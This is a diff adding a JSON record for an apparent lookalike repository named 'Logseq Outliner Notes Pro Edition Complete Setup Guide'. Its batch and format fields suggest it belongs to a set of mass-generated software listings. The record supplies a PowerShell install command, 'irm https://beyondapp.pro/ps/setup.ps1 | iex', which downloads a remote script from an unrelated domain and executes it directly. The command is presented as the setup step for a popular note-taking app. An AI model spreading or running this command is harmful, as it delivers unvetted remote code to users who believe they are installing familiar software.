@@ -1,0 +1,25 @@
+{
+  "repo": "Logseq-Outliner-Notes-Pro-Edition-Complete-Setup-Guide",
+  "product": "Logseq Outliner Notes Pro Edition Complete Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "productivity",
+  "topics": [
+    "logseq-outliner-notes-pro-edition-comple",
+    "logseq",
+    "outliner",
+    "notes",
+    "pro",
+    "edition",
+    "complete",
+    "productivity",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
